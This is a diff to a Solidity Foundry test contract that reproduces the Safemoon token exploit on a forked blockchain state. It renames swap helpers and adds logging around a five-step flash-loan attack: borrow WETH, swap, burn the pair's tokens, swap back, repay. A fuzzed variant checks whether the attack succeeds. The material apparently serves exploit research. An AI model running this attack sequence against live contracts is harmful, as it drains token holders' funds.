@@ -291,22 +291,6 @@ contract SafemoonTestBase is Test, BlockLoader {
         uint256 amount,
         uint256 amountOut
     ) internal eurus {
-        weth.transfer(address(pair), amount);
-        pair.swap(0, amountOut, attacker, new bytes(0));
-    }
-
-    function swap_pair_attacker_safemoon_weth(
-        uint256 amount,
-        uint256 amountOut
-    ) internal eurus {
-        safemoon.transfer(address(pair), amount);
-        pair.swap(amountOut, 0, attacker, new bytes(0));
-    }
-
-    function swap_safemoon_attacker_weth_safemoon(
-        uint256 amount,
-        uint256 amountOut
-    ) internal eurus {
         address[] memory path = new address[](2);
         path[0] = address(weth);
         path[1] = address(safemoon);
@@ -323,7 +307,7 @@ contract SafemoonTestBase is Test, BlockLoader {
         tradeRouter.swapExactTokensForTokensWithFeeAmount(trade);
     }
 
-    function swap_safemoon_attacker_safemoon_weth(
+    function swap_pair_attacker_safemoon_weth(
         uint256 amount,
         uint256 amountOut
     ) internal eurus {
@@ -352,17 +336,27 @@ contract SafemoonTestBase is Test, BlockLoader {
         vm.startPrank(attacker);
         vm.warp(blockTimestamp);
         vm.roll(26854757);
+        emit log_named_uint("amt0", 1000 ether);
         borrow_weth_owner(1000 ether);
         printBalance("After step0 ");
-        swap_safemoon_attacker_weth_safemoon(800 * 1e18, 0);
+        emit log_named_uint("amt1", 800 * 1e18);
+        emit log_named_uint("amt2", 0);
+        swap_pair_attacker_weth_safemoon(800 * 1e18, 0);
         printBalance("After step1 ");
+        emit log_named_uint(
+            "amt3",
+            safemoon.balanceOf(address(pair)) - 1000000000
+        );
         burn_safemoon_pair(safemoon.balanceOf(address(pair)) - 1000000000);
         printBalance("After step2 ");
-        swap_safemoon_attacker_safemoon_weth(
+        emit log_named_uint("amt4", safemoon.balanceOf(address(attacker)));
+        emit log_named_uint("amt5", 0);
+        swap_pair_attacker_safemoon_weth(
             safemoon.balanceOf(address(attacker)),
             0
         );
         printBalance("After step3 ");
+        emit log_named_uint("amt6", 1000 ether);
         payback_weth_owner(1000 ether);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
@@ -383,11 +377,11 @@ contract SafemoonTestBase is Test, BlockLoader {
         vm.roll(26854757);
         vm.assume(amt6 >= amt0);
         borrow_weth_owner(amt0);
-        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
+        swap_pair_attacker_weth_safemoon(amt1, amt2);
         burn_safemoon_pair(amt3);
-        swap_safemoon_attacker_safemoon_weth(amt4, amt5);
+        swap_pair_attacker_safemoon_weth(amt4, amt5);
         payback_weth_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
